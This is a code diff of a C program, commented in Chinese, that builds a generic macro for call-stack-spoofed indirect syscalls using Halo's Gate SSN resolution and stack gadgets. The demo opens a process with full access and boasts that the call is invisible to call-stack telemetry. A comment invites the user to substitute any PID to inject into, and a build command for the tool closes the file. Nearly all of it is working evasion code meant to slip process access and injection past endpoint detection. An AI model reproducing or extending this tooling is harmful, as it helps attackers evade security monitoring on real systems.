@@ -4,6 +4,13 @@
 #include <intrin.h> // for __readgsqword
 
 #define NTDLL_HASH 0x22d3b5ed
+
+// 声明在 gate.s 中写的外部汇编函数
+extern void SetSSN(DWORD ssn);
+extern void SetSyscallAddr(PVOID addr);
+extern void SetSpoofParams(PVOID gadgetAddr, DWORD stackSize);
+extern NTSTATUS SpoofedSyscall();
+
 // 必须的底层结构体定义
 
 typedef struct _CLIENT_ID {
@@ -11,19 +18,45 @@ typedef struct _CLIENT_ID {
     HANDLE UniqueThread;
 } CLIENT_ID, *PCLIENT_ID;
 
-// 定义我们的终极武器签名：它长着 NtOpenProcess 的脸，但其实是 SpoofedSyscall 的心
-typedef NTSTATUS (NTAPI* fnSpoofedNtOpenProcess)(
-    PHANDLE ProcessHandle,
-    ACCESS_MASK DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes,
-    PCLIENT_ID ClientId
-);
+// 1. 万能签名：使用变参宏完美匹配 x64 ABI 的底层调用约定
+typedef NTSTATUS (NTAPI* fnUniversalSpoof)(PVOID FirstArg, ...);
 
-// 声明你在 gate.s 中写的外部汇编函数
-extern void SetSSN(DWORD ssn);
-extern void SetSyscallAddr(PVOID addr);
-extern void SetSpoofParams(PVOID gadgetAddr, DWORD stackSize);
-extern NTSTATUS SpoofedSyscall();
+// 2. 智能 Gadget 选择器：根据参数数量确保栈空间足够，防止“自杀”
+SPOOF_GADGET* GetSuitableGadget(DWORD argCount) {
+    // x64 ABI: 前 4 个参数用寄存器，第 5 个及以后入栈
+    // 所需最小栈大小 = 返回地址(8) + 影子空间(32) + 额外参数空间
+    DWORD minStackRequired = 0x58; 
+    if (argCount > 4) {
+        minStackRequired += (argCount - 4) * 8; // 为每一个多出的参数增加 8 字节
+    }
+
+    for (int i = 0; i < g_GadgetCount; i++) {
+        // 寻找第一个深度足够的黄金傀儡
+        if (GoldenGadgets[i].dwStackSize >= minStackRequired) {
+            return &GoldenGadgets[i];
+        }
+    }
+    return NULL; 
+}
+
+// 强化版宏：使用 (fnUniversalSpoof) 进行暴力强转，解决参数数量检查报错
+#define VEGA_CALL(ApiHash, ArgCount, ...) ({                                       \
+    NTSTATUS _status = 0xC0000001;                                                 \
+    PVOID _pAddr = GetApi(ApiHash);                                                \
+    HALO_ENTRY _entry;                                                             \
+    SPOOF_GADGET* _pGadget = GetSuitableGadget(ArgCount);                          \
+                                                                                   \
+    if (_pAddr && GetHaloEntry(_pAddr, &_entry) && _pGadget) {                     \
+        SetSSN(_entry.SSN);                                                        \
+        SetSyscallAddr(_entry.SyscallAddress);                                      \
+        SetSpoofParams(_pGadget->pGadgetAddress, _pGadget->dwStackSize);           \
+        fnUniversalSpoof _pFire = (fnUniversalSpoof)SpoofedSyscall;                \
+        _status = _pFire(__VA_ARGS__);                                             \
+    }                                                                              \
+    _status;                                                                       \
+})
+
+
 
 int main() {
     //初始化检查
@@ -82,51 +115,22 @@ int main() {
     
     //开火
     //还是以NtOpenProcess为例，先通过Halo‘s Gate获取SSN和syscall。
-    PVOID pNtOpenProcess = GetApi(0x5003c058); 
-    if (pNtOpenProcess){
-        HALO_ENTRY entry;
-        if(GetHaloEntry(pNtOpenProcess, &entry)){
-        // 1. 准备目标参数
-        HANDLE hTargetProcess = NULL;
-        OBJECT_ATTRIBUTES oa = { 0 };
-        oa.Length = sizeof(OBJECT_ATTRIBUTES); // 必须初始化长度，否则内核会报错
+    HANDLE hTargetProcess = NULL;
+    OBJECT_ATTRIBUTES oa = { 0 };
+    oa.Length = sizeof(OBJECT_ATTRIBUTES); // 必须初始化长度，否则内核会报错
         
-        CLIENT_ID cid = { 0 };
-        // 为了安全测试，我们 Open 我们自己。你可以替换成任何你想要注入的 PID
-        cid.UniqueProcess = (HANDLE)(ULONG_PTR)GetCurrentProcessId(); 
-
-        // 2. 装填弹药 (Weaponizing the Engine)
-        // 假设你的 Halo's Gate 已经获取到了 wNtOpenProcessSSN 和 pNtOpenProcessSyscallAddr
-        // 这里你需要替换成你真实解析到的变量名！
-        SetSSN(entry.SSN); 
-        SetSyscallAddr(entry.SyscallAddress);
-        
-        // 取出最完美的第一个傀儡 (Gadget 0) 穿上隐身衣
-        SetSpoofParams(GoldenGadgets[0].pGadgetAddress, GoldenGadgets[0].dwStackSize);
-
-        printf("[*] Engine Loaded. Target PID: %lu. Firing...\n", GetCurrentProcessId());
-
-        // 3. 强转函数指针：把汇编存根披上 NtOpenProcess 的外衣
-        fnSpoofedNtOpenProcess pSpoofedNtOpenProcess = (fnSpoofedNtOpenProcess)SpoofedSyscall;
-
-        // 4. THE PUNCHLINE: 开枪！
-        // 此时 C 语言编译器会乖乖把这 4 个参数放进 RCX, RDX, R8, R9 寄存器
-        // 然后跳入你的 SpoofedSyscall 进行堆栈伪造！
-        NTSTATUS status = pSpoofedNtOpenProcess(&hTargetProcess, PROCESS_ALL_ACCESS, &oa, &cid);
-
-        // 5. 战果确认
-        if (status == 0x00000000) { // 0x00000000 即 STATUS_SUCCESS
-            printf("[+] MASTERPIECE! Successfully got handle: 0x%p\n", hTargetProcess);
-            printf("[+] This call was completely invisible to Call Stack Telemetry.\n");
-        } else {
-            printf("[-] Misfire! NTSTATUS Code: 0x%08X\n", status);
-        }
-
-        getchar();
-        return 0;
-        }
-
+    CLIENT_ID cid = { 0 };
+    // 为了安全测试，我们 Open 我们自己。你可以替换成任何你想要注入的 PID
+    cid.UniqueProcess = (HANDLE)(ULONG_PTR)GetCurrentProcessId(); 
+    NTSTATUS status = VEGA_CALL(0x5003c058, 4, &hTargetProcess, PROCESS_ALL_ACCESS, &oa, &cid);
+    if (status == 0x00000000) {
+        printf("[+] MASTERPIECE! Successfully got handle: 0x%p\n", hTargetProcess);
+        printf("[+] This call was completely invisible to Call Stack Telemetry.\n");
+    } else {
+        printf("[-] Misfire! System call failed with status: 0x%08X\n", status);
     }
+    getchar();
+    return 0;
 }
 
 //x86_64-w64-mingw32-gcc -I include src/main.c src/halo_gate.c src/spoof.c asm/gate.s -o halo_spoofer.exe -m64 -static -w
